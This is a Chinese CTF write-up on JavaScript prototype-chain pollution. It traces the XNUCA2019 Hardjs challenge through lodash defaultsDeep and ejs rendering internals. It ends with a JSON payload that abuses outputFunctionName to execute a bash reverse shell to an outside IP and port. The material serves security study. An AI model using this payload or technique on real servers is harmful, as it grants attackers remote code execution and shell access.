<p>ECMAScript6 引入了一套新的关键字用来实现 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Classes">class</a>。使用基于类语言的开发人员会对这些结构感到熟悉，但它们是不同的。JavaScript 仍然基于原型。这些新的关键字包括 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/class"><code>class</code></a>, <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Classes/constructor"><code>constructor</code></a>，<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Classes/static"><code>static</code></a>，<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Classes/extends"><code>extends</code></a> 和 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/super"><code>super</code></a>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Polygon</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(height, width) &#123;</span><br><span class="line">    <span class="built_in">this</span>.height = height;</span><br><span class="line">    <span class="built_in">this</span>.width = width;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Square</span> <span class="keyword">extends</span> <span class="title">Polygon</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(sideLength) &#123;</span><br><span class="line">    <span class="built_in">super</span>(sideLength, sideLength);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">get</span> <span class="title">area</span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.height * <span class="built_in">this</span>.width;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">set</span> <span class="title">sideLength</span>(<span class="params">newLength</span>) &#123;</span><br><span class="line">    <span class="built_in">this</span>.height = newLength;</span><br><span class="line">    <span class="built_in">this</span>.width = newLength;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> square = <span class="keyword">new</span> Square(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p><code>hasOwnProperty</code> 是 JavaScript 中唯一一个处理属性并且<strong>不会</strong>遍历原型链的方法。</p>
<hr>
<p>下面根据Smi1e 师傅的文章来过一遍基础知识</p>
<p>注: 参考资料2</p>
<p>JavaScript 是一门面向对象的语言，但是在 ES6 之前，JavaScript 中没有 class 语法。不过在它的构造函数（<code>constructor</code>）就相当于类，通过构造函数，我们可以生成实例化的对象。</p>
<p>看下面的代码示例即可: </p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415112310.png"></p>
<p>从最后的代码可以知道: </p>
<blockquote>
<p><strong>实例对象的 <code>__proto__</code>与创建该实例对象的构造函数的 <code>prototype</code> 是相等的。</strong></p>
</blockquote>
<p>图来自参考资料2: </p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415112511.png"></p>
<p>每个原型对象都有一个 <strong>constructor 属性，指向相关联的构造函数</strong>，所以构造函数和构造函数的 prototype 是可以相互指向的。实例对象也可以访问constructor 属性指向其构造函数。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415112825.png"></p>
<p>原型链: 在JavaScript 中, 如果访问某个属性,首先会在实例对象的内部寻找, 如果没找到, 就在该对象的原型<code>cat.__proto__</code> 即 <code>Cat.prototype</code> 上找, 对象的原型也是对象, 也有原型, 如果在对象的原型上也没有找到目标属性,则会在对象的原型的原型<code>Cat.prototype.__proto__</code> 上寻找, 依次内推, <strong>直到找到了这个属性或者到达了最顶层.</strong></p>
<p>实例对象原型的原型是<code>Object.prototype</code>，而它的原型是null，null 没有原型，所以 <code>Object.prototype</code> 就是原型链的最顶端。</p>
<p>在原型上一层一层找, 这就是原型链.</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415113203.png"></p>
<h1 id="0x01-原型链污染攻击"><a href="#0x01-原型链污染攻击" class="headerlink" title="0x01 原型链污染攻击"></a>0x01 原型链污染攻击</h1><p>终于我们来到了笔记的正文✖, 其实基础知识更重要 ✔</p>
<p>在JavaScript中访问一个对象的属性可以用<code>a.b.c</code>或者<code>a[&quot;b&quot;][&quot;c&quot;]</code>来访问。由于对象是无序的,当使用第二种方式访问对象时,只能使用指明下标的方式去访问。因此我们可以通过<code>a[&quot;__proto__&quot;]</code>的方式去访问其原型对象。</p>
<p>在Javascript中可以通过<code>example.a.b</code>或<code>example.a[&quot;b&quot;]</code>来对数组进行访问,<code>example.a</code>访问的是<code>example</code>对象下的<code>a</code>对象的<code>b</code>,而<code>example.a[&quot;b&quot;]</code>则是访问<code>example</code>对象下的<code>a</code>数组的下标为<code>b</code>的值。</p>
<p>由于对象是无序的,当使用第二种方式访问对象时,只能使用指明下标的方式去访问。</p>
<p>因此我们可以通过<code>a[&quot;__proto__&quot;]</code>的方式去访问其原型对象。</p>
<p><strong>在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。</strong></p>
<h1 id="0x02-Hacking-in-CTF"><a href="#0x02-Hacking-in-CTF" class="headerlink" title="0x02    Hacking in CTF"></a>0x02    Hacking in CTF</h1><p>前面说了那么多基础知识, 重要的还是实际操作, <strong>know it then hack it !</strong></p>
<h2 id="XNUCA2019-Hardjs"><a href="#XNUCA2019-Hardjs" class="headerlink" title="XNUCA2019 Hardjs"></a>XNUCA2019 Hardjs</h2><ul>
<li><p>原型链污染到RCE(太难了…复现的过程很吃力…找不到简单的题呀!)</p>
</li>
<li><p>此题前后端都存在原型链污染漏洞</p>
</li>
<li><p>有多种Hacking 方式, 这里我选择先知上的那种方法来进行复现… 另外的方法都有能力了再说</p>
<ul>
<li>CVE-2019-11358 jQuery 原型链污染漏洞 <a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/201762.html">https://www.freebuf.com/vuls/201762.html</a> jQuery jQuery 3.4 Drupal Drupal 8.6.15 Drupal Drupal 8.5.15 Drupal Drupal  7.66 Backdrop Backdrop 1.12.6 Backdrop Backdrop 1.11.9                             </li>
<li>CVE-2019-10744 Lodash 库原型链污染漏洞 <a target="_blank" rel="noopener" href="https://www.venustech.com.cn/article/1/9577.html">https://www.venustech.com.cn/article/1/9577.html</a> 影响范围：  4.17.11之前的所有版本</li>
</ul>
</li>
</ul>
<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>题目页面长这样, 是一个登陆界面,注册一个admin账号,显示用户名重复, <del>那么很明显应该是要伪造身份成为admin的样了</del></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415135304.png"></p>
<p>进去之后是这样</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415135849.png"></p>
<p>打开网络测试不同的功能点,当我发表内容时,发出的请求, 是JSON格式的 , 既然是js漏洞问题, 那么就看看js文件</p>
<p>这题在buu上只有 这几个js文件, 几个重要的js文件在GitHub上看吧. 原来这道题是给了附件的, 那么就把源码下下来吧</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415145752.png"></p>
<p>目录中<code>server.js</code> 和<code>robot.py</code> 估计是重点审计对象, 干就完了</p>
<p>在<code>robot.py</code> 中, 如图所示, flag 是被定义在了环境变量中并且是admin的密码, <del>如果以admin的账号登录,那么就可能得到flag, 现在就是如何去找到漏洞点, 进行身份伪造</del></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415155932.png"></p>
<p>实在是没啥具体思路, 只有隐隐约约那么一点儿味道. 还是看wp复现吧.TTTTTTTCCCCCCL</p>
<p>在<code>server.js</code> 中可以看到路由: </p>
<ul>
<li>/ 主页</li>
<li>/static 静态文件</li>
<li>/sandbox 展示用户HTML 数据用的沙盒</li>
<li>/login 登陆</li>
<li>/register 注册</li>
<li>/get json 接口 获取数据库中保存的数据</li>
<li>/add 用户添加数据的借口</li>
</ul>
<p>除了<code>/static</code>，<code>/login</code>和<code>/register</code>以外，所以路由在访问的时候都会经过一个<code>auth</code>函数进行身份验证</p>
<p>因为做了转义处理，所以应该是没有Sql注入的问题，需要从其他方面下手</p>
<p>从初始化的地方我们可以得到如下信息: </p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415165256.png"></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;)).use(bodyParser.json())</span><br></pre></td></tr></table></figure>

<p>这里允许了我们通过JSON格式向服务器传递参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.set(&#39;json escape&#39;,true)</span><br><span class="line">app.set(&#39;views&#39;, &#39;.&#x2F;views&#39;)</span><br><span class="line">app.set(&#39;view engine&#39;, &#39;ejs&#39;)</span><br></pre></td></tr></table></figure>

<p>视图是通过<code>ejs</code> 模板渲染的</p>
<p>这个服务器是<code>Node.js</code> 采用了<code>express</code> 框架….  有点慌了是不是</p>
<h3 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h3><p>在<code>server.js</code>  的<code>/get</code> 路由中: </p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415171558.png"></p>
<p>当查询的结果超过五条, 那么就会<code>merge</code> 合并成为1条, 具体的过程就是从mysql中一条一条的查询当前用户的所有数据, 然后一条一条的合并</p>
<p>其中的</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;raws.length ;i++)&#123;</span><br><span class="line">     lodash.defaultsDeep(doms,<span class="built_in">JSON</span>.parse( raws[i].dom ));</span><br></pre></td></tr></table></figure>

<p>正好是<code>lodash</code> 库的一个原型链漏洞的攻击对象</p>
<blockquote>
<p>通过构造函数重载的方式，Lodash 库中的函数 defaultsDeep 很有可能会被欺骗添加或修改 Object.prototype 的属性，最终可能导致 Web 应用程序崩溃或改变其行为，具体取决于受影响的用例。</p>
</blockquote>
<p>参考的师傅说 查看了版本刚好是<code>4.17.11</code> 我不知道他是怎么看的… ✖</p>
<p>在<code>package.json</code> 中可以看到这些配置的版本信息 ✔</p>
<hr>
<p>既然要伪造admin的身份, 那么就应该把眼光放在session cookie 以及 认证的代码上.</p>
<p>在<code>server.js</code> 中, <code>auth</code> 函数</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// var session = req.session;</span></span><br><span class="line">    <span class="keyword">if</span>(!req.session.login || !req.session.userid )&#123;</span><br><span class="line">        res.redirect(<span class="number">302</span>,<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        next();</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们知道, 在没有登陆的时候, 是不存在session的, 也就是说 <code>req.session.login</code> 以及 <code>req.session.userid</code>  是 undefinded </p>
<p>而session 对象的父类肯定包含了<code>Object</code> , 故我们只需要修改Object 中的这部分代码就可以绕过登录, 以admin的身份访问页面(利用原型链污染)</p>
<p>审计<code>server.js</code> 可以知道, 所有的结果都是通过<code>res.render</code> 来进行渲染的, <strong>那么尝试从这里入手, 跟进模板渲染的过程来寻找符合上面条件的利用点</strong></p>
<p>通过跟进<code>/login</code> 的<code>res.render</code>  , 我这里没办法跟进啊??!</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415180136.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200303222123.jpg"></p>
<p>为了复现过程的完整性, 那么就看着wp继续走下去吧, 下面的内容直接CTRL C/V</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">res.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">view, options, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> app = <span class="built_in">this</span>.req.app;</span><br><span class="line">  <span class="keyword">var</span> done = callback;</span><br><span class="line">  <span class="keyword">var</span> opts = options || &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> req = <span class="built_in">this</span>.req;</span><br><span class="line">  <span class="keyword">var</span> self = <span class="built_in">this</span>;</span><br><span class="line"></span><br><span class="line">  ....</span><br><span class="line"></span><br><span class="line">  <span class="comment">// render</span></span><br><span class="line">  app.render(view, opts, done);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可以发现来到了<code>response.js</code>的中对<code>res.render</code>的定义，并且调用了<code>app.render</code>，同时，将进行了参数配置传递。继续跟进，来到<code>application.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">app.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">name, options, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> cache = <span class="built_in">this</span>.cache;</span><br><span class="line">  <span class="keyword">var</span> done = callback;</span><br><span class="line">  <span class="keyword">var</span> engines = <span class="built_in">this</span>.engines;</span><br><span class="line">  <span class="keyword">var</span> opts = options;</span><br><span class="line">  <span class="keyword">var</span> renderOptions = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> view;</span><br><span class="line">  ....</span><br><span class="line">  <span class="comment">// render</span></span><br><span class="line">  tryRender(view, renderOptions, done);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>发现调用了<code>tryRender</code>，并继续传递配置，我们继续跟进</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tryRender</span>(<span class="params">view, options, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    view.render(options, callback);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    callback(err);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用了<code>view.render</code>，继续跟进就来到了<code>view.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">View.prototype.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">options, callback</span>) </span>&#123;</span><br><span class="line">  debug(<span class="string">&#x27;render &quot;%s&quot;&#x27;</span>, <span class="built_in">this</span>.path);</span><br><span class="line">  <span class="built_in">this</span>.engine(<span class="built_in">this</span>.path, options, callback);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>调用了<code>engine</code>，终于来到了模板渲染引擎<code>ejs.js</code>中。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.renderFile = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> args = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>);</span><br><span class="line">  <span class="keyword">var</span> filename = args.shift();</span><br><span class="line">  <span class="keyword">var</span> cb;</span><br><span class="line">  <span class="keyword">var</span> opts = &#123;<span class="attr">filename</span>: filename&#125;;</span><br><span class="line">  <span class="keyword">var</span> data;</span><br><span class="line">  <span class="keyword">var</span> viewOpts;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> tryHandleCache(opts, data, cb);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>发现跳到<code>renderFile</code>函数，并且又调用了<code>tryHandleCache</code>，我这里省略了opts传递的代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tryHandleCache</span>(<span class="params">options, data, cb</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result;</span><br><span class="line">  ...</span><br><span class="line">      result = handleCache(options)(data);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以看到<code>handleCache</code>返回了一个函数，并且将data传入进行执行，而这个result就是最后生成的页面了，这个时候可以感觉到，有RCE的可能性。继续跟进。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleCache</span>(<span class="params">options, template</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> func;</span><br><span class="line">  <span class="keyword">var</span> filename = options.filename;</span><br><span class="line">  <span class="keyword">var</span> hasTemplate = <span class="built_in">arguments</span>.length &gt; <span class="number">1</span>;</span><br><span class="line">  ...</span><br><span class="line">  func = <span class="built_in">exports</span>.compile(template, options);</span><br><span class="line">  <span class="keyword">if</span> (options.cache) &#123;</span><br><span class="line">    <span class="built_in">exports</span>.cache.set(filename, func);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> func;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进生成func的<code>compile</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.compile = <span class="function"><span class="keyword">function</span> <span class="title">compile</span>(<span class="params">template, opts</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> templ;</span><br><span class="line">  ...</span><br><span class="line">  templ = <span class="keyword">new</span> Template(template, opts);</span><br><span class="line">  <span class="keyword">return</span> templ.compile();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>发现新建了一个Template对象并执行其成员方法得到返回的func。我们跟进其成员方法<code>compile</code>查看</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">compile: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> src;</span><br><span class="line">    <span class="keyword">var</span> fn;</span><br><span class="line">    <span class="keyword">var</span> opts = <span class="built_in">this</span>.opts;</span><br><span class="line">    <span class="keyword">var</span> prepended = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> appended = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> escapeFn = opts.escapeFunction;</span><br><span class="line">    <span class="keyword">var</span> ctor;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">this</span>.source) &#123;</span><br><span class="line">      <span class="built_in">this</span>.generateSource();</span><br><span class="line">      prepended += <span class="string">&#x27;  var __output = [], __append = __output.push.bind(__output);&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      <span class="keyword">if</span> (opts.outputFunctionName) &#123;</span><br><span class="line">        prepended += <span class="string">&#x27;  var &#x27;</span> + opts.outputFunctionName + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (opts._with !== <span class="literal">false</span>) &#123;</span><br><span class="line">        prepended +=  <span class="string">&#x27;  with (&#x27;</span> + opts.localsName + <span class="string">&#x27; || &#123;&#125;) &#123;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">        appended += <span class="string">&#x27;  &#125;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      appended += <span class="string">&#x27;  return __output.join(&quot;&quot;);&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      <span class="built_in">this</span>.source = prepended + <span class="built_in">this</span>.source + appended;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">      src = <span class="built_in">this</span>.source;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (opts.async) &#123;</span><br><span class="line">        <span class="comment">// Have to use generated function for this, since in envs without support,</span></span><br><span class="line">        <span class="comment">// it breaks in parsing</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          ctor = (<span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">&#x27;return (async function()&#123;&#125;).constructor;&#x27;</span>))();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">          <span class="keyword">if</span> (e <span class="keyword">instanceof</span> <span class="built_in">SyntaxError</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;This environment does not support async/await&#x27;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        ctor = <span class="built_in">Function</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      fn = <span class="keyword">new</span> ctor(opts.localsName + <span class="string">&#x27;, escapeFn, include, rethrow&#x27;</span>, src);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return a callable function which will execute the function</span></span><br><span class="line">    <span class="comment">// created by the source-code, with the passed data as locals</span></span><br><span class="line">    <span class="comment">// Adds a local `include` function which allows full recursive include</span></span><br><span class="line">    <span class="keyword">var</span> returnedFn = <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> include = <span class="function"><span class="keyword">function</span> (<span class="params">path, includeData</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> d = utils.shallowCopy(&#123;&#125;, data);</span><br><span class="line">        <span class="keyword">if</span> (includeData) &#123;</span><br><span class="line">          d = utils.shallowCopy(d, includeData);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> includeFile(path, opts)(d);</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="keyword">return</span> fn.apply(opts.context, [data || &#123;&#125;, escapeFn, include, rethrow]);</span><br><span class="line">    &#125;;</span><br><span class="line">    returnedFn.dependencies = <span class="built_in">this</span>.dependencies;</span><br><span class="line">    <span class="keyword">return</span> returnedFn;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p>这段代码中</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (opts.outputFunctionName) &#123;</span><br><span class="line">        prepended += <span class="string">&#x27;  var &#x27;</span> + opts.outputFunctionName + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>就是我们一直寻找的东西，这个对象会与其他生成的模板字符串一起拼接到<code>this.source</code>，然后传递给<code>src</code>，接着是<code>fn</code>，然后以<code>returnedFn</code>返回并最后被执行。而一路跟进的时候可以发现，并<strong>没有</strong><code>outputFunctionName</code>的身影，所以只要给Object的<code>prototype</code>加上这个成员(属性)，我们就可以实现从原型链污染到RCE的攻击过程了！</p>
<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><h4 id="js原型链到RCE"><a href="#js原型链到RCE" class="headerlink" title="js原型链到RCE"></a>js原型链到RCE</h4><p>题目环境是可以访问<code>process</code> 的(可以用来进行反弹shell), 而这里的环境不行..</p>
<p>payload: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;content&quot;: &#123;</span><br><span class="line">        &quot;constructor&quot;: &#123;</span><br><span class="line">            &quot;prototype&quot;: &#123;</span><br><span class="line">            &quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;174.0.14.127&#x2F;2333 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;type&quot;: &quot;test&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

